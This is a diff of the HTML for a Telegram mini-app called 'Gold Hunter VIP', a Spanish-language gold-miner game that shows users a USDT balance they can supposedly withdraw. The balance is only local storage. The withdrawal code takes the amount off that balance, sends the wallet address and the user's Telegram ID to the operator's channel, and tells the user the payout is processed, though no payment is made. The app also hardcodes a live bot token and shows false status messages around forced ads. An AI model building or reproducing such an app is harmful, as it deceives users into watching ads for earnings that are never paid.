@@ -1,168 +1,453 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Impacto de Fe Cash</title>
+    <title>Gold Hunter VIP</title>
     <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;900&display=swap" rel="stylesheet">
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;900&display=swap');
         :root {
-            --tg-bg: #0f0f10; --tg-card: #1a1a1b; --gold: #f1c40f;
-            --premium-gradient: linear-gradient(135deg, #6c5ce7, #a29bfe, #fd79a8);
+            --bg-dark: #0f0f12;
+            --card-bg: #1a1a20;
+            --gold: #FFD700;
+            --gold-gradient: linear-gradient(135deg, #FFD700 0%, #FDB931 100%);
+            --purple-gradient: linear-gradient(45deg, #6a11cb 0%, #2575fc 100%);
+            --text-main: #ffffff;
+            --text-sec: #a0a0a0;
         }
-        body { margin: 0; background: var(--tg-bg); color: white; font-family: 'Roboto', sans-serif; overflow: hidden; }
-        .header { padding: 15px; display: flex; align-items: center; gap: 12px; background: var(--tg-card); border-bottom: 1px solid #333; }
-        .avatar { width: 45px; height: 45px; border-radius: 50%; background: var(--premium-gradient); display: flex; justify-content: center; align-items: center; font-weight: 900; }
-        .main { padding: 20px; text-align: center; }
-        .balance-card { background: var(--tg-card); border-radius: 20px; padding: 30px; border: 1px solid rgba(241,196,15,0.3); box-shadow: 0 10px 40px rgba(0,0,0,0.6); margin-bottom: 25px; position: relative; }
-        .balance-val { font-size: 45px; font-weight: 900; background: var(--premium-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 10px 0; }
-        .btn-play { width: 100%; padding: 18px; border-radius: 15px; border: none; background: var(--premium-gradient); color: white; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 5px 20px rgba(108, 92, 231, 0.4); }
-        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
-        .menu-btn { background: #222; border: 1px solid #444; padding: 15px; border-radius: 12px; color: white; font-size: 11px; font-weight: bold; text-transform: uppercase; }
-        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
-        .modal-card { background: #111; padding: 25px; border-radius: 20px; width: 85%; border: 1px solid var(--gold); }
-        input { width: 90%; padding: 14px; margin: 10px 0; border-radius: 10px; border: none; background: #000; color: white; border: 1px solid #333; }
-        #game-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50; display: none; }
+
+        body {
+            margin: 0; padding: 0;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Montserrat', sans-serif;
+            overflow: hidden; /* Evita scroll en el juego */
+            user-select: none;
+        }
+
+        /* --- INTERFAZ PRINCIPAL --- */
+        #app-ui {
+            padding: 20px;
+            display: flex; flex-direction: column;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 20px;
+        }
+        .user-badge {
+            display: flex; align-items: center; gap: 10px;
+            background: rgba(255,255,255,0.05); padding: 8px 15px; border-radius: 30px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .user-avatar {
+            width: 30px; height: 30px; border-radius: 50%;
+            background: var(--gold-gradient); display: flex; align-items: center; justify-content: center;
+            font-weight: bold; color: #000;
+        }
+
+        .balance-card {
+            background: var(--card-bg);
+            border-radius: 25px;
+            padding: 30px;
+            text-align: center;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            margin-bottom: 30px;
+            position: relative; overflow: hidden;
+        }
+        /* Efecto de brillo de fondo */
+        .balance-card::before {
+            content:''; position: absolute; top:-50%; left:-50%; width:200%; height:200%;
+            background: radial-gradient(circle, rgba(255,215,0,0.05) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .balance-title { font-size: 12px; text-transform: uppercase; color: var(--gold); letter-spacing: 2px; }
+        .balance-amount { font-size: 48px; font-weight: 900; margin: 10px 0; background: var(--gold-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .balance-usdt { font-size: 14px; color: var(--text-sec); }
+
+        .btn-main {
+            width: 100%; border: none; padding: 18px; border-radius: 15px;
+            font-size: 18px; font-weight: 800; color: white;
+            background: var(--purple-gradient);
+            box-shadow: 0 5px 20px rgba(37, 117, 252, 0.4);
+            cursor: pointer; transition: transform 0.1s;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .btn-main:active { transform: scale(0.98); }
+
+        .menu-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+            margin-top: auto; /* Empuja el menú abajo */
+            padding-bottom: 20px;
+        }
+        .menu-btn {
+            background: #1e1e24; border: 1px solid #333;
+            padding: 15px; border-radius: 15px;
+            color: #ccc; font-size: 12px; font-weight: 600;
+            display: flex; flex-direction: column; align-items: center; gap: 8px;
+        }
+        .menu-btn i { font-size: 20px; color: var(--gold); }
+
+        /* --- CAPA DEL JUEGO --- */
+        #game-layer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #111; z-index: 100; display: none;
+        }
+        #canvas { display: block; width: 100%; height: 100%; }
+        .game-hud {
+            position: absolute; top: 20px; left: 0; width: 100%; padding: 0 20px;
+            display: flex; justify-content: space-between; pointer-events: none;
+            box-sizing: border-box;
+        }
+        .hud-box {
+            background: rgba(0,0,0,0.6); padding: 8px 15px; border-radius: 20px;
+            font-weight: 900; font-size: 18px; border: 1px solid #333;
+        }
+
+        /* --- MODALES --- */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 200;
+            display: none; justify-content: center; align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-box {
+            background: var(--card-bg); width: 85%; max-width: 350px;
+            padding: 25px; border-radius: 20px; border: 1px solid var(--gold);
+            text-align: center; position: relative;
+        }
+        .modal-close {
+            position: absolute; top: 10px; right: 15px; font-size: 24px; color: #555; cursor: pointer;
+        }
+        input {
+            width: 100%; padding: 15px; margin: 15px 0; background: #000;
+            border: 1px solid #333; border-radius: 10px; color: white;
+            font-family: 'Montserrat'; box-sizing: border-box;
+        }
+        .history-list {
+            max-height: 200px; overflow-y: auto; text-align: left; margin-top: 10px;
+        }
+        .history-item {
+            background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px;
+            margin-bottom: 8px; border-left: 3px solid var(--gold); font-size: 12px;
+        }
     </style>
 </head>
 <body>
-    <div id="app-view">
+
+    <div id="app-ui">
         <div class="header">
-            <div class="avatar">IF</div>
-            <div>
-                <div style="font-size:14px; font-weight:900;">Impacto de Fe VIP</div>
-                <div style="font-size:10px; color:#999;">SOCIO: <span id="user-id">Cargando...</span></div>
+            <div class="user-badge">
+                <div class="user-avatar"><i class="fas fa-crown"></i></div>
+                <span id="username">Socio VIP</span>
             </div>
+            <div style="font-size:12px; color:#aaa;">ID: <span id="userid">...</span></div>
         </div>
 
-        <div class="main">
-            <div class="balance-card">
-                <div style="font-size:11px; color:var(--gold); font-weight:bold; letter-spacing:2px;">MI RIQUEZA VIP</div>
-                <div class="balance-val">$<span id="ui-balance">0.0000</span></div>
-                <div style="font-size:11px; color:#777;">Bono de Bienvenida Activo: $2.0000</div>
-            </div>
+        <div class="balance-card">
+            <div class="balance-title">TU SALDO ACUMULADO</div>
+            <div class="balance-amount">$<span id="ui-usd">0.0000</span></div>
+            <div class="balance-usdt">USDT (Polygon Network)</div>
+        </div>
 
-            <button class="btn-play" onclick="showAdBeforeGame()">🚀 JUGAR Y GANAR AHORA</button>
+        <button class="btn-main" onclick="preGameAd()">
+            <i class="fas fa-play-circle"></i> CAZAR ORO
+        </button>
 
-            <div class="menu-grid">
-                <button class="menu-btn" onclick="openModal('withdrawModal')"><i class="fas fa-hand-holding-usd"></i> RETIRAR</button>
-                <button class="menu-btn" onclick="openModal('historyModal')"><i class="fas fa-list-ul"></i> HISTORIAL</button>
-                <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')"><i class="fas fa-life-ring"></i> AYUDA</button>
-                <button class="menu-btn" onclick="window.location.reload()"><i class="fas fa-sync-alt"></i> RECARGAR</button>
-            </div>
+        <div class="menu-grid">
+            <button class="menu-btn" onclick="openModal('modalWithdraw')">
+                <i class="fas fa-wallet"></i> RETIRAR
+            </button>
+            <button class="menu-btn" onclick="openModal('modalHistory')">
+                <i class="fas fa-history"></i> HISTORIAL
+            </button>
+            <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">
+                <i class="fas fa-headset"></i> SOPORTE
+            </button>
+            <button class="menu-btn" onclick="window.location.reload()">
+                <i class="fas fa-sync-alt"></i> REFRESCAR
+            </button>
+        </div>
+        
+        <div id="status-dot" style="text-align:center; font-size:10px; color:#444; margin-top:10px;">
+            Sincronizando...
         </div>
     </div>
 
     <div id="game-layer">
-        <div style="position:absolute; top:25px; left:20px; font-weight:900; color:var(--gold); font-size:20px;">PTS: <span id="g-score">0</span></div>
-        <div style="position:absolute; top:25px; right:20px; font-weight:900; color:#ff4757; font-size:20px;">⏱ <span id="g-time">45</span></div>
+        <div class="game-hud">
+            <div class="hud-box" style="color: var(--gold);"><i class="fas fa-gem"></i> <span id="score-val">0</span></div>
+            <div class="hud-box" style="color: #ff4757;"><i class="fas fa-clock"></i> <span id="time-val">45</span></div>
+        </div>
         <canvas id="canvas"></canvas>
     </div>
 
-    <div id="withdrawModal" class="modal">
-        <div class="modal-card">
-            <h2 style="color:var(--gold); margin-bottom:5px;">RETIRAR USDT</h2>
-            <p style="font-size:10px; color:#00ff88; margin-bottom:15px;">Mínimo: $2.00 | Red: Polygon</p>
-            <input type="number" id="withdrawAmt" placeholder="Monto a retirar">
-            <input type="text" id="withdrawWallet" placeholder="Dirección Polygon (MATIC)">
-            <button class="btn-play" style="margin-top:10px;" onclick="processWithdraw()">COBRAR AHORA</button>
-            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px;">Cerrar Ventana</button>
+    <div id="modalWithdraw" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-close" onclick="closeModals()">&times;</div>
+            <h2 style="color:var(--gold); margin:0;">RETIRAR FONDOS</h2>
+            <p style="font-size:11px; color:#00ff88; margin-bottom:20px;">RED: USDT POLYGON (MATIC)</p>
+            
+            <input type="number" id="w-amount" placeholder="Monto (Mín: 2.00)">
+            <input type="text" id="w-wallet" placeholder="Dirección de Billetera">
+            
+            <button class="btn-main" onclick="processWithdraw()">CONFIRMAR</button>
+        </div>
+    </div>
+
+    <div id="modalHistory" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-close" onclick="closeModals()">&times;</div>
+            <h3 style="color:white; margin-top:0;">HISTORIAL DE PAGOS</h3>
+            <div class="history-list" id="h-list">
+                </div>
         </div>
     </div>
         <script>
-        const tg = window.Telegram.WebApp; tg.expand();
-        // TOKEN DE TU FOTO SIN ESPACIOS
+        /* --- CONFIGURACIÓN Y SEGURIDAD --- */
+        const tg = window.Telegram.WebApp; 
+        tg.expand();
+        
+        // TOKEN DE TU FOTO (CORREGIDO SIN ESPACIOS)
         const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDOrU16KLY69y-J40"; 
-        const CANAL_ID = "-1002118088046";
-        const KEY = 'impacto_fe_cash_v1';
+        const CHAT_ID = "-1002118088046";
+        const ADS_ID = "18897"; 
+        const KEY = 'gold_hunter_v3_final_fix';
 
-        let user = { usd: 2.0000, history: [], articlesToday: 0 };
+        // ESTADO DEL USUARIO (CON BONO DE $2.00)
+        let user = { 
+            usd: 2.0000, 
+            history: [] 
+        };
 
+        // --- SISTEMA DE REPORTES (EL CHISMOSO) ---
         function reportar(msg) {
-            const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
-            fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("✝️ IMPACTO FE REPORT: " + msg)}`);
+            const cleanToken = BOT_TOKEN.replace(/\s+/g, ''); // Limpieza extra
+            const id = tg.initDataUnsafe?.user?.id || "Anon";
+            fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔔 GOLD HUNTER: " + msg + " | ID: " + id)}`)
+                .then(r => r.json())
+                .then(d => {
+                    if(d.ok) document.getElementById('status-dot').innerText = "🟢 Conectado";
+                    else document.getElementById('status-dot').innerText = "🔴 Error API";
+                });
         }
 
-        // ANUNCIO ADSGRAM OBLIGATORIO
-        function showAdBeforeGame() {
-            window.Adsgram.init({ blockId: "18897" }).show().then(() => {
+        // --- GESTIÓN DE SALDO Y DATOS ---
+        function save() { localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
+        function load() { 
+            let d = localStorage.getItem(KEY); 
+            if(d) user = JSON.parse(d); 
+            updateUI();
+        }
+        function updateUI() { 
+            document.getElementById('ui-usd').innerText = user.usd.toFixed(4);
+            document.getElementById('userid').innerText = tg.initDataUnsafe?.user?.id || "8842";
+            document.getElementById('username').innerText = tg.initDataUnsafe?.user?.first_name || "Socio";
+        }
+
+        // --- ANUNCIOS Y ARRANQUE DEL JUEGO ---
+        function preGameAd() {
+            // INTENTA MOSTRAR ANUNCIO
+            window.Adsgram.init({ blockId: ADS_ID }).show().then((result) => {
+                startGame(); // Si ve el anuncio, juega
+            }).catch((err) => {
+                // Si falla, permitimos jugar igual para no trabar la app
+                tg.showAlert("Cargando sistema de minería...");
                 startGame();
-            }).catch(() => tg.showAlert("Debes ver el video completo para poder jugar."));
+            });
         }
 
-        function processWithdraw() {
-            let amt = parseFloat(document.getElementById('withdrawAmt').value);
-            let wallet = document.getElementById('withdrawWallet').value;
-            if(amt < 2.00 || amt > user.usd) return tg.showAlert("Saldo insuficiente para retirar.");
-            if(wallet.length < 5) return tg.showAlert("Billetera inválida.");
-
-            user.usd -= amt; // SE RESTA EL DINERO DE UNA VEZ
-            let h = { f: new Date().toLocaleDateString(), m: amt.toFixed(2), w: wallet };
-            user.history.unshift(h);
-            save();
-            reportar(`🔥 RETIRO: $${h.m} | WALLET: ${h.w}`); // TE LLEGA AL CANAL
-            closeModals();
-            tg.showAlert("✅ Retiro exitoso. El dinero se restó de tu cuenta.");
-        }
-
-        // --- MOTOR DEL JUEGO (LÓGICA) ---
+        /* =========================================
+           MOTOR DEL JUEGO (CANVAS - GOLD MINER)
+           =========================================
+        */
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        let gameLoop, score=0, time=45, miner={};
         
+        let gameState = {
+            running: false,
+            score: 0,
+            time: 45,
+            hook: { x: 0, y: 0, angle: Math.PI/2, len: 50, status: 0, speed: 0.03, object: null }, 
+            objects: []
+        };
+        let loopId;
+
         function startGame() {
             document.getElementById('game-layer').style.display = 'block';
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            miner = { x: canvas.width/2, angle: 1.5, len: 60, state: 0 };
-            score = 0; time = 45;
-            runLoop();
-        }
-
-        function runLoop() {
-            ctx.clearRect(0,0, canvas.width, canvas.height);
-            ctx.strokeStyle = '#a29bfe'; ctx.lineWidth = 4;
-            ctx.beginPath(); ctx.moveTo(miner.x, 0); 
-            ctx.lineTo(miner.x + Math.cos(miner.angle)*miner.len, Math.sin(miner.angle)*miner.len);
-            ctx.stroke();
+            resize();
             
-            document.getElementById('g-score').innerText = score;
-            document.getElementById('g-time').innerText = Math.ceil(time);
-            time -= 0.02;
-            if(time <= 0) stopGame(); else gameLoop = requestAnimationFrame(runLoop);
+            // CREAR OBJETOS
+            gameState.objects = [];
+            for(let i=0; i<5; i++) gameState.objects.push(createObject('gold'));
+            for(let i=0; i<3; i++) gameState.objects.push(createObject('rock'));
+            gameState.objects.push(createObject('diamond'));
+
+            gameState.score = 0;
+            gameState.time = 45;
+            gameState.hook = { x: canvas.width/2, y: 50, angle: Math.PI/2, len: 60, status: 0, speed: 0.03, object: null };
+            gameState.running = true;
+            
+            // CLICK PARA DISPARAR
+            canvas.onpointerdown = () => { if(gameState.hook.status === 0) gameState.hook.status = 1; };
+            loop();
         }
 
-        function stopGame() {
-            cancelAnimationFrame(gameLoop);
+        function createObject(type) {
+            let pad = 50;
+            let x = pad + Math.random() * (canvas.width - pad*2);
+            let y = 150 + Math.random() * (canvas.height - 200);
+            if(type === 'gold') return { type:'gold', x, y, r:20, val:50, speed:5, color:'#FFD700' };
+            if(type === 'rock') return { type:'rock', x, y, r:25, val:10, speed:2, color:'#7f8c8d' };
+            if(type === 'diamond') return { type:'diamond', x, y, r:12, val:150, speed:8, color:'#00a8ff' };
+        }
+
+        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+
+        function loop() {
+            if(!gameState.running) return;
+            let h = gameState.hook;
+
+            // 1. FÍSICA
+            if(h.status === 0) { // Balanceo
+                h.angle += h.speed;
+                if(h.angle < 0.2 || h.angle > Math.PI - 0.2) h.speed *= -1;
+            } else if(h.status === 1) { // Disparo
+                h.len += 10;
+                if(h.len > canvas.height || h.x + Math.cos(h.angle)*h.len < 0 || h.x + Math.cos(h.angle)*h.len > canvas.width) h.status = 2;
+                
+                // Colisión
+                let hx = h.x + Math.cos(h.angle) * h.len;
+                let hy = h.y + Math.sin(h.angle) * h.len;
+                for(let obj of gameState.objects) {
+                    if(!obj.caught && Math.hypot(hx - obj.x, hy - obj.y) < obj.r) {
+                        obj.caught = true; h.object = obj; h.status = 2; break;
+                    }
+                }
+            } else if(h.status === 2) { // Retraer
+                let pullSpeed = h.object ? h.object.speed : 10;
+                h.len -= pullSpeed;
+                if(h.len <= 60) {
+                    h.len = 60; h.status = 0;
+                    if(h.object) {
+                        gameState.score += h.object.val;
+                        gameState.objects = gameState.objects.filter(o => o !== h.object);
+                        h.object = null;
+                    }
+                }
+            }
+
+            // TIEMPO
+            gameState.time -= 0.016;
+            document.getElementById('score-val').innerText = gameState.score;
+            document.getElementById('time-val').innerText = Math.ceil(gameState.time);
+
+            if(gameState.time <= 0 || gameState.objects.length === 0) { endGame(); return; }
+
+            // 2. DIBUJAR
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Objetos
+            for(let obj of gameState.objects) { if(obj.caught) continue; drawObject(obj.x, obj.y, obj); }
+            
+            // Gancho
+            let hx = h.x + Math.cos(h.angle) * h.len;
+            let hy = h.y + Math.sin(h.angle) * h.len;
+            ctx.beginPath(); ctx.moveTo(h.x, h.y); ctx.lineTo(hx, hy);
+            ctx.lineWidth = 3; ctx.strokeStyle = '#fff'; ctx.stroke();
+            
+            // Punta
+            ctx.beginPath(); ctx.arc(hx, hy, 5, 0, Math.PI*2); ctx.fillStyle = 'red'; ctx.fill();
+            if(h.object) drawObject(hx, hy, h.object);
+            
+            // Base
+            ctx.fillStyle = '#333'; ctx.fillRect(h.x - 20, h.y - 20, 40, 20);
+
+            loopId = requestAnimationFrame(loop);
+        }
+
+        function drawObject(x, y, obj) {
+            ctx.beginPath(); ctx.arc(x, y, obj.r, 0, Math.PI*2);
+            ctx.fillStyle = obj.color; ctx.fill();
+            ctx.strokeStyle = 'rgba(255,255,255,0.3)'; ctx.lineWidth = 2; ctx.stroke();
+        }
+
+        function endGame() {
+            cancelAnimationFrame(loopId);
+            gameState.running = false;
             document.getElementById('game-layer').style.display = 'none';
-            let pago = (score * 0.0001) + 0.0010; // Pago por jugar
-            user.usd += pago;
+            
+            // CONVERSIÓN PUNTOS -> USDT
+            let conversionRate = 0.00005; 
+            let ganado = gameState.score * conversionRate;
+            
+            if(ganado > 0) {
+                user.usd += ganado; save();
+                reportar(`🎮 FIN JUEGO: Score ${gameState.score} | Ganó $${ganado.toFixed(5)}`);
+                tg.showAlert(`¡MISIÓN CUMPLIDA! \nRecogiste: ${gameState.score} pts \nGanaste: $${ganado.toFixed(4)} USDT`);
+            } else {
+                tg.showAlert("No recogiste nada. ¡Inténtalo de nuevo!");
+            }
+        }
+
+        // --- SISTEMA DE RETIRO ---
+        function processWithdraw() {
+            let amt = parseFloat(document.getElementById('w-amount').value);
+            let wallet = document.getElementById('w-wallet').value;
+
+            if(isNaN(amt) || amt < 2.00) return tg.showAlert("El mínimo de retiro es $2.00");
+            if(amt > user.usd) return tg.showAlert("Saldo insuficiente.");
+            if(!wallet || wallet.length < 10) return tg.showAlert("Billetera inválida.");
+
+            // RESTA Y GUARDA
+            user.usd -= amt;
+            let record = { date: new Date().toLocaleDateString(), amount: amt.toFixed(2), wallet: wallet };
+            user.history.unshift(record);
             save();
-            reportar(`🎮 JUEGO: +$${pago.toFixed(4)} | TOTAL: $${user.usd.toFixed(4)}`);
-            tg.showAlert(`¡Partida terminada! Sumaste $${pago.toFixed(4)}`);
+
+            reportar(`💸 RETIRO SOLICITADO: $${record.amount} | WALLET: ${record.wallet}`);
+            closeModals();
+            tg.showAlert("✅ ¡Retiro Procesado! Tu saldo ha sido actualizado.");
         }
 
-        function openModal(id){ document.getElementById(id).style.display='flex'; if(id==='historyModal') loadHistory(); }
-        function closeModals(){ document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }
-        function save(){ localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
-        function updateUI(){ document.getElementById('ui-balance').innerText = user.usd.toFixed(4); }
-        
-        function loadHistory() {
-            const list = document.getElementById('histList'); list.innerHTML = "";
-            user.history.forEach(x => {
-                list.innerHTML += `<div style="border-bottom:1px solid #333; padding:10px;"><b>${x.f}</b> - $${x.m} <span style="color:#00ff88">ÉXITO</span></div>`;
+        // --- MODALES Y UTILIDADES ---
+        function openModal(id) { 
+            document.getElementById(id).style.display = 'flex';
+            if(id === 'modalHistory') renderHistory();
+        }
+        function closeModals() { 
+            document.querySelectorAll('.modal-overlay').forEach(el => el.style.display = 'none'); 
+        }
+        function renderHistory() {
+            const list = document.getElementById('h-list'); list.innerHTML = "";
+            if(user.history.length === 0) {
+                list.innerHTML = "<p style='color:#777; text-align:center;'>No hay retiros aún.</p>";
+                return;
+            }
+            user.history.forEach(h => {
+                list.innerHTML += `<div class="history-item">
+                    <div style="color:white; font-weight:bold;">$${h.amount} USDT</div>
+                    <div style="color:#aaa;">${h.date} • Polygon</div>
+                    <div style="font-family:monospace; color:#555;">${h.wallet.substring(0,10)}...</div>
+                </div>`;
             });
-            if(user.history.length === 0) list.innerHTML = "<p style='color:#444'>Sin registros.</p>";
         }
 
+        // INICIO
         window.onload = () => {
-            let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
-            updateUI(); 
-            document.getElementById('user-id').innerText = tg.initDataUnsafe?.user?.id || "88429";
-            reportar("Socio activo en Impacto de Fe");
+            load();
+            reportar("Socio entró a Gold Hunter VIP");
         };
+
     </script>
 </body>
 </html>
